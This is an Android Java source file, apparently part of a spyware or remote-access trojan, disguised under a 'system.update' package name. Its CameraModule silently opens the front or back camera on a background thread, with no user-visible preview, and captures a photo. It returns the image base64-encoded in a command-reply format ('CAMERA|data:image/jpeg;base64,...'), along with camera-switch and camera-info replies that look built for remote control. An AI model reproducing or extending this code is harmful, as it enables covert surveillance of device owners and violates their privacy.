package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class CameraModule {
    private static final String TAG = "CameraModule";
    private static final int CAMERA_TIMEOUT_MS = 15000; // 15 seconds
    
    private Context context;
    private int backCameraId = -1;
    private int frontCameraId = -1;
    private int currentCameraId = -1;
    private boolean isFrontCamera = false;
    private Handler mainHandler;
    
    public interface CameraCallback {
        void onPhotoTaken(String base64Image);
        void onError(String error);
    }
    
    public CameraModule(Context context) {
        this.context = context;
        this.mainHandler = new Handler(Looper.getMainLooper());
        initCameras();
    }
    
    private void initCameras() {
        try {
            int numberOfCameras = Camera.getNumberOfCameras();
            Log.d(TAG, "Number of cameras: " + numberOfCameras);
            
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    backCameraId = i;
                    Log.d(TAG, "Found back camera: " + i);
                } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    frontCameraId = i;
                    Log.d(TAG, "Found front camera: " + i);
                }
            }
            
            // Set default to back camera
            if (backCameraId != -1) {
                currentCameraId = backCameraId;
                isFrontCamera = false;
                Log.d(TAG, "Default camera set to BACK (ID: " + currentCameraId + ")");
            } else if (frontCameraId != -1) {
                currentCameraId = frontCameraId;
                isFrontCamera = true;
                Log.d(TAG, "Default camera set to FRONT (ID: " + currentCameraId + ")");
            } else {
                Log.e(TAG, "No cameras found!");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing cameras", e);
        }
    }
    
    public String switchCamera() {
        try {
            Log.d(TAG, "switchCamera() called - Current: " + (isFrontCamera ? "FRONT" : "BACK"));
            
            if (frontCameraId != -1 && backCameraId != -1) {
                if (currentCameraId == backCameraId) {
                    currentCameraId = frontCameraId;
                    isFrontCamera = true;
                    Log.d(TAG, "Switched to FRONT camera");
                    return "CAMERA_SWITCH|Front camera activated";
                } else {
                    currentCameraId = backCameraId;
                    isFrontCamera = false;
                    Log.d(TAG, "Switched to BACK camera");
                    return "CAMERA_SWITCH|Back camera activated";
                }
            } else if (frontCameraId == -1 && backCameraId != -1) {
                return "CAMERA_SWITCH|Only back camera available";
            } else if (backCameraId == -1 && frontCameraId != -1) {
                return "CAMERA_SWITCH|Only front camera available";
            }
            return "CAMERA_SWITCH|No camera available";
        } catch (Exception e) {
            Log.e(TAG, "Error switching camera", e);
            return "CAMERA_SWITCH|Error: " + e.getMessage();
        }
    }
    
    public String getCurrentCameraInfo() {
        try {
            if (currentCameraId != -1) {
                return "CAMERA_INFO|Current: " + (isFrontCamera ? "FRONT" : "BACK");
            }
            return "CAMERA_INFO|No camera selected";
        } catch (Exception e) {
            Log.e(TAG, "Error getting camera info", e);
            return "CAMERA_INFO|Error: " + e.getMessage();
        }
    }
    
  public void takePhoto(final CameraCallback callback) {
    Log.d(TAG, "🚀 takePhoto() called - Thread: " + Thread.currentThread().getName());
    Log.d(TAG, "📸 Checking permissions...");
    
    if (!checkPermission()) {
        Log.e(TAG, "❌ Camera permission not granted");
        callback.onError("ERROR: No camera permission");
        return;
    }
    Log.d(TAG, "✅ Camera permission granted");
    
    if (currentCameraId == -1) {
        Log.e(TAG, "❌ No camera available (currentCameraId = -1)");
        callback.onError("ERROR: No camera available");
        return;
    }
    
    Log.d(TAG, "📸 Taking photo with camera: " + (isFrontCamera ? "FRONT" : "BACK") + " (ID: " + currentCameraId + ")");
    
    // Run camera operations in a background thread
    new Thread(() -> {
        Camera camera = null;
        try {
            Log.d(TAG, "🔵 Opening camera ID: " + currentCameraId + " on thread: " + Thread.currentThread().getName());
            camera = Camera.open(currentCameraId);
            Log.d(TAG, "✅ Camera opened successfully");
            
            Camera.Parameters parameters = camera.getParameters();
            Log.d(TAG, "📷 Got camera parameters");
            
            // Log all available parameters for debugging
            Log.d(TAG, "📷 Supported picture sizes: " + (parameters.getSupportedPictureSizes() != null ? 
                parameters.getSupportedPictureSizes().size() : "null"));
            
            if (parameters.getSupportedPictureSizes() != null) {
                for (Camera.Size size : parameters.getSupportedPictureSizes()) {
                    if (size.width == 1920 || size.width == 1280) {
                        Log.d(TAG, "📷 Available size: " + size.width + "x" + size.height);
                    }
                }
            }
            
            // Set photo quality
            parameters.setJpegQuality(95);
            Log.d(TAG, "✅ Set JPEG quality to 95");
            
            // Set the best picture size
            Camera.Size pictureSize = getBestPictureSize(parameters);
            if (pictureSize != null) {
                parameters.setPictureSize(pictureSize.width, pictureSize.height);
                Log.d(TAG, "✅ Set picture size to: " + pictureSize.width + "x" + pictureSize.height);
            }
            
            // Set focus mode
            if (parameters.getSupportedFocusModes() != null) {
                Log.d(TAG, "📷 Supported focus modes: " + parameters.getSupportedFocusModes());
                if (parameters.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE)) {
                    parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE);
                    Log.d(TAG, "✅ Set focus mode to CONTINUOUS_PICTURE");
                } else if (parameters.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
                    parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
                    Log.d(TAG, "✅ Set focus mode to AUTO");
                }
            }
            
            camera.setParameters(parameters);
            Log.d(TAG, "✅ Parameters set on camera");
            
            // Start preview (required for auto focus)
            Log.d(TAG, "🔄 Starting preview...");
            camera.startPreview();
            Log.d(TAG, "✅ Preview started");
            
            // Small delay for camera to adjust
            Log.d(TAG, "⏱️ Waiting 1500ms for camera to stabilize...");
            Thread.sleep(1500);
            
            // Take picture
            Log.d(TAG, "📸 Calling camera.takePicture()...");
            final Semaphore captureSemaphore = new Semaphore(0);
            final AtomicReference<byte[]> imageData = new AtomicReference<>();
            final AtomicReference<String> errorMsg = new AtomicReference<>();
            
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera cam) {
                    Log.d(TAG, "✅✅✅ Picture taken callback triggered! Data size: " + (data != null ? data.length : "null") + " bytes");
                    
                    if (data != null && data.length > 0) {
                        imageData.set(data);
                        Log.d(TAG, "✅ Image data captured: " + data.length + " bytes");
                        
                        // Save to file for debugging
                        try {
                            File picturesDir = new File("/sdcard/DCIM/");
                            if (!picturesDir.exists()) {
                                picturesDir = context.getExternalFilesDir(null);
                            }
                            
                            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                            File photoFile = new File(picturesDir, "debug_photo_" + timestamp + ".jpg");
                            FileOutputStream fos = new FileOutputStream(photoFile);
                            fos.write(data);
                            fos.close();
                            Log.d(TAG, "✅✅ Debug photo saved to: " + photoFile.getAbsolutePath());
                        } catch (Exception e) {
                            Log.e(TAG, "❌ Failed to save debug photo", e);
                        }
                    } else {
                        Log.e(TAG, "❌❌ Picture data is null or empty");
                        errorMsg.set("Picture data is null");
                    }
                    
                    Log.d(TAG, "🔓 Releasing semaphore");
                    captureSemaphore.release();
                }
            });
            
            Log.d(TAG, "⏱️ takePicture() called, waiting for callback with timeout " + CAMERA_TIMEOUT_MS + "ms...");
            
            // Wait for capture with timeout
            boolean acquired = captureSemaphore.tryAcquire(CAMERA_TIMEOUT_MS, TimeUnit.MILLISECONDS);
            Log.d(TAG, "🔓 Semaphore acquired: " + acquired);
            
            if (!acquired) {
                Log.e(TAG, "❌❌ Camera capture timed out after " + CAMERA_TIMEOUT_MS + "ms");
                errorMsg.set("Camera capture timed out");
            }
            
            // Stop preview and release camera
            Log.d(TAG, "🛑 Stopping preview...");
            camera.stopPreview();
            Log.d(TAG, "🔓 Releasing camera...");
            camera.release();
            camera = null;
            Log.d(TAG, "✅ Camera released");
            
            // Check for errors
            if (errorMsg.get() != null) {
                final String error = errorMsg.get();
                Log.e(TAG, "❌ Error during capture: " + error);
                mainHandler.post(() -> callback.onError("ERROR: " + error));
                return;
            }
            
            byte[] data = imageData.get();
            if (data == null || data.length == 0) {
                Log.e(TAG, "❌ No image data received");
                mainHandler.post(() -> callback.onError("ERROR: No image data received"));
                return;
            }
            
            Log.d(TAG, "🔄 Converting " + data.length + " bytes to base64...");
            String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
            Log.d(TAG, "✅ Base64 conversion complete, length: " + base64Image.length());
            
            // Return result on main thread
            final String result = "CAMERA|data:image/jpeg;base64," + base64Image;
            Log.d(TAG, "📤 Sending response back to callback, total length: " + result.length());
            mainHandler.post(() -> callback.onPhotoTaken(result));
            
        } catch (Exception e) {
            Log.e(TAG, "❌❌❌ Camera capture failed with exception", e);
            final String errorMsg = e.getMessage() != null ? e.getMessage() : "Unknown error";
            final String stackTrace = Log.getStackTraceString(e);
            Log.e(TAG, "Stack trace: " + stackTrace);
            mainHandler.post(() -> callback.onError("ERROR: " + errorMsg));
        } finally {
            if (camera != null) {
                try {
                    Log.d(TAG, "🔓 Releasing camera in finally block");
                    camera.release();
                } catch (Exception e) {
                    Log.e(TAG, "Error releasing camera", e);
                }
            }
        }
    }).start();
}

    
    public void testCameraAccess() {
    Log.d(TAG, "🔍 Testing camera access...");
    Camera camera = null;
    try {
        if (currentCameraId != -1) {
            camera = Camera.open(currentCameraId);
            Log.d(TAG, "✅ Successfully opened camera " + currentCameraId);
            camera.release();
            Log.d(TAG, "✅ Successfully released camera");
        } else {
            Log.e(TAG, "❌ No camera ID available");
        }
    } catch (Exception e) {
        Log.e(TAG, "❌ Failed to access camera", e);
    }
}
    private Camera.Size getBestPictureSize(Camera.Parameters parameters) {
        if (parameters.getSupportedPictureSizes() == null) {
            Log.d(TAG, "No supported picture sizes");
            return null;
        }
        
        Camera.Size bestSize = null;
        int targetWidth = 1920; // Target 1080p
        
        Log.d(TAG, "Available picture sizes:");
        for (Camera.Size size : parameters.getSupportedPictureSizes()) {
            Log.d(TAG, "  " + size.width + "x" + size.height);
            if (bestSize == null) {
                bestSize = size;
            } else if (Math.abs(size.width - targetWidth) < Math.abs(bestSize.width - targetWidth)) {
                bestSize = size;
            }
        }
        
        Log.d(TAG, "Selected picture size: " + (bestSize != null ? bestSize.width + "x" + bestSize.height : "null"));
        return bestSize;
    }
    
    private boolean checkPermission() {
        boolean hasPermission = ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
        Log.d(TAG, "Camera permission check: " + hasPermission);
        return hasPermission;
    }
    
    public void cleanup() {
        Log.d(TAG, "cleanup() called");
    }
}
